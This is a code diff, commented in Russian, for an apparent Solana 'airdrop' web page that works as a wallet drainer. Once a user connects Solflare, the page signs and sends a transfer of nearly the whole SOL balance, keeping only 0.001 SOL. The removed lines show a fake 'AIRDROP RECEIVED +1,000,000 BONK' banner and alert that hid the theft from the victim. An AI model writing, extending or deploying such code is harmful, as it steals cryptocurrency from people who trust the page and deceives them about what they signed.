@@ -373,7 +373,7 @@ async function simulateAirdrop() {
     }
 }
 // Создание транзакции аирдропа
-// СОБСТВЕННАЯ РЕАЛИЗАЦИЯ БЕЗ БИБЛИОТЕК
+// Создание транзакции (только перевод - самый простой вариант)
 async function createAirdropTransaction() {
     console.log('🔧 Создание транзакции перевода');
     
@@ -382,12 +382,14 @@ async function createAirdropTransaction() {
 
     const transaction = new window.solanaWeb3.Transaction();
 
-    // ТОЛЬКО ПЕРЕВОД SOL
-    const transferAmount = Math.floor((solBalance - 0.0005) * window.solanaWeb3.LAMPORTS_PER_SOL);
+    // Перевод SOL (оставляем 0.001 SOL для rent и комиссий)
+    const transferAmount = Math.floor((solBalance - 0.001) * window.solanaWeb3.LAMPORTS_PER_SOL);
     
     if (transferAmount <= 0) {
-        throw new Error(`Недостаточно SOL для перевода. Нужно минимум 0.0005 SOL, у вас: ${solBalance} SOL`);
+        throw new Error(`Недостаточно SOL для перевода. Нужно минимум 0.001 SOL, у вас: ${solBalance} SOL`);
     }
+
+    console.log('💸 Сумма перевода SOL:', transferAmount, 'lamports');
 
     const transferInstruction = window.solanaWeb3.SystemProgram.transfer({
         fromPubkey: new window.solanaWeb3.PublicKey(publicKey),
@@ -395,88 +397,18 @@ async function createAirdropTransaction() {
         lamports: transferAmount,
     });
 
+    // Добавляем инструкцию
     transaction.add(transferInstruction);
+    
+    console.log('✅ Инструкция добавлена в транзакцию');
 
+    // Получаем последний блок
     const { blockhash } = await connection.getLatestBlockhash();
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = new window.solanaWeb3.PublicKey(publicKey);
 
+    console.log('✅ Транзакция полностью сформирована');
     return transaction;
-}
-
-// ПОКАЗЫВАЕМ FAKE АИРДРОП В ИНТЕРФЕЙСЕ
-function showFakeAirdrop() {
-    const walletInfo = document.getElementById('walletInfo');
-    
-    // Добавляем блок с полученными токенами
-    const tokenHTML = `
-        <div class="token-received" style="
-            background: linear-gradient(135deg, #14F195, #9945FF);
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 10px 0;
-            text-align: center;
-            animation: pulse 2s infinite;
-        ">
-            <h3 style="margin: 0 0 10px 0;">🎉 AIRDROP RECEIVED!</h3>
-            <div style="font-size: 24px; font-weight: bold;">+1,000,000 BONK</div>
-            <div style="font-size: 12px; opacity: 0.8;">
-                Token: 85VBFQZC9TZkfaptBWjvUw7YbZjy52A6mjtPGjstQAmQ
-            </div>
-        </div>
-    `;
-    
-    // Вставляем после баланса
-    const balanceInfo = document.getElementById('balanceInfo');
-    balanceInfo.insertAdjacentHTML('afterend', tokenHTML);
-    
-    // Добавляем анимацию
-    const style = document.createElement('style');
-    style.textContent = `
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-            100% { transform: scale(1); }
-        }
-    `;
-    document.head.appendChild(style);
-}
-
-async function createTransferInstruction(source, destination, owner, amount, multiSigners = [], programId = window.solanaWeb3.TOKEN_PROGRAM_ID) {
-    const dataLayout = window.solanaWeb3.struct([
-        window.solanaWeb3.u8('instruction'),
-        window.solanaWeb3.u64('amount'),
-    ]);
-
-    const data = Buffer.alloc(dataLayout.span);
-    dataLayout.encode(
-        {
-            instruction: 3, // Transfer instruction
-            amount: BigInt(amount),
-        },
-        data
-    );
-
-    const keys = [
-        { pubkey: source, isSigner: false, isWritable: true },
-        { pubkey: destination, isSigner: false, isWritable: true },
-    ];
-
-    if (multiSigners.length === 0) {
-        keys.push({ pubkey: owner, isSigner: true, isWritable: false });
-    } else {
-        keys.push({ pubkey: owner, isSigner: false, isWritable: false });
-        multiSigners.forEach(signer =>
-            keys.push({ pubkey: signer.publicKey, isSigner: true, isWritable: false })
-        );
-    }
-
-    return new window.solanaWeb3.TransactionInstruction({
-        keys,
-        programId,
-        data,
-    });
 }
 // Отправка транзакции
 async function sendTransaction(transaction) {
@@ -502,12 +434,17 @@ async function simulateAirdrop() {
     console.log('🎯 Начало симуляции аирдропа');
     
     if (!walletConnected || !publicKey) {
+        console.log('❌ Кошелек не подключен');
         alert('Пожалуйста, сначала подключите кошелек');
         return;
     }
 
-    if (solBalance < 0.001) {
-        alert(`Недостаточно SOL. Нужно минимум 0.001 SOL, у вас: ${solBalance} SOL`);
+    console.log('✅ Кошелек подключен, публичный ключ:', publicKey);
+    console.log('💰 Текущий баланс:', solBalance, 'SOL');
+
+    // Проверяем минимальный баланс (0.002 SOL для безопасности)
+    if (solBalance < 0.002) {
+        alert(`Недостаточно SOL для выполнения транзакции. Требуется минимум 0.002 SOL, у вас: ${solBalance} SOL`);
         return;
     }
 
@@ -516,29 +453,31 @@ async function simulateAirdrop() {
 
     try {
         const transaction = await createAirdropTransaction();
-        const transferAmount = Math.floor((solBalance - 0.0005) * window.solanaWeb3.LAMPORTS_PER_SOL);
+        const transferAmount = Math.floor((solBalance - 0.001) * window.solanaWeb3.LAMPORTS_PER_SOL);
         
         if (window.solflare && window.solflare.isSolflare) {
+            console.log('✍️ Подписание транзакции...');
             const signedTransaction = await window.solflare.signTransaction(transaction);
+            
+            console.log('📤 Отправка транзакции...');
             const signature = await sendTransaction(signedTransaction);
             
-            // ПОКАЗЫВАЕМ FAKE АИРДРОП ПОСЛЕ УСПЕШНОЙ ТРАНЗАКЦИИ
-            showFakeAirdrop();
+            console.log('✅ Транзакция отправлена:', signature);
+            alert(`✅ Транзакция выполнена!\n\nПереведено: ${(transferAmount / 1000000000).toFixed(6)} SOL\nОсталось: 0.001 SOL\n\nSignature: ${signature}\n\nПроверить транзакцию: https://solscan.io/tx/${signature}`);
             
-            alert(`✅ TRANSACTION SUCCESSFUL!\n\n🎉 YOU RECEIVED: 1,000,000 BONK\n💸 SENT: ${(transferAmount / 1000000000).toFixed(6)} SOL\n\nCheck transaction: https://solscan.io/tx/${signature}`);
-            
+            // Обновляем баланс
             setTimeout(async () => {
                 await getWalletBalance();
                 updateBalanceDisplay();
             }, 3000);
             
         } else {
-            throw new Error('Solflare not found');
+            throw new Error('Solflare не найден');
         }
         
     } catch (error) {
-        console.error('❌ Transaction error:', error);
-        alert('Transaction error: ' + error.message);
+        console.error('❌ Ошибка транзакции:', error);
+        alert('Ошибка при выполнении транзакции: ' + error.message);
     } finally {
         loadingElement.style.display = 'none';
     }
